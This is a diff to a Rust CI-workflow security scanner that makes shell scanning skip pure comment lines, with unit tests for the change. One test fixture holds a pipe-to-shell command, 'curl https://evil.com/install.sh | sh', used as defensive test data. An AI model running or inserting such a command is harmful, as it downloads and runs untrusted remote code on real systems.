@@ -300,6 +300,14 @@ fn find_run_line(file_content: &str, run_content: &str, start: usize) -> (usize,
     (0, start)
 }
 
+/// Whether a shell source line is a pure comment and thus never executed.
+/// Trailing comments on a command line are not covered — stripping an
+/// unquoted `#` would require full shell tokenization and risks hiding a
+/// real payload embedded in a quoted string.
+fn is_shell_comment_line(line: &str) -> bool {
+    line.trim_start().starts_with('#')
+}
+
 fn scan_shell_content(
     content: &str,
     source_file: &str,
@@ -314,6 +322,9 @@ fn scan_shell_content(
     // and escape the checksum downgrade loop below.
     let mut pipe_shell_lines: HashSet<usize> = HashSet::new();
     for (i, line) in lines.iter().enumerate() {
+        if is_shell_comment_line(line) {
+            continue;
+        }
         let line_num = base_line + i;
         let before = collector.findings.len();
         check_patterns(
@@ -332,6 +343,9 @@ fn scan_shell_content(
     let findings_before = collector.findings.len();
 
     for (i, line) in lines.iter().enumerate() {
+        if is_shell_comment_line(line) {
+            continue;
+        }
         let line_num = base_line + i;
         if pipe_shell_lines.contains(&line_num) {
             continue;
@@ -915,6 +929,53 @@ jobs:
     fn find_run_line_no_match_preserves_cursor() {
         let (line, cursor) = find_run_line("foo\nbar\n", "baz", 1);
         assert_eq!((line, cursor), (0, 1));
+    }
+
+    #[test]
+    fn is_shell_comment_line_detects_leading_hash() {
+        assert!(is_shell_comment_line("# comment"));
+        assert!(is_shell_comment_line("    # indented comment"));
+        assert!(is_shell_comment_line("\t# tab indent"));
+    }
+
+    #[test]
+    fn is_shell_comment_line_rejects_trailing_hash() {
+        // Trailing comments aren't covered — an unquoted `#` can't be
+        // distinguished from one inside a string without real shell parsing.
+        assert!(!is_shell_comment_line("echo hello  # note"));
+        assert!(!is_shell_comment_line("foo=\"# not a comment\""));
+    }
+
+    #[test]
+    fn shell_scan_skips_comment_line_with_cargo_install() {
+        // A comment documenting what a sed command matches shouldn't fire —
+        // the shell never executes comment-line content.
+        let mut c = AuditCollector::new(true);
+        scan_shell_content(
+            "# Match `cargo install TOOL --locked`",
+            "test.sh",
+            1,
+            "",
+            &mut c,
+            &DEFAULT_CONFIG,
+        );
+        assert!(c.findings.is_empty());
+        assert!(c.allowed.is_empty());
+    }
+
+    #[test]
+    fn shell_scan_skips_comment_line_with_curl_pipe_to_shell() {
+        // Even a pipe-to-shell pattern should be skipped inside a comment.
+        let mut c = AuditCollector::new(true);
+        scan_shell_content(
+            "# Example of a bad pattern: curl https://evil.com/install.sh | sh",
+            "test.sh",
+            1,
+            "",
+            &mut c,
+            &DEFAULT_CONFIG,
+        );
+        assert!(c.findings.is_empty());
     }
 
     #[test]
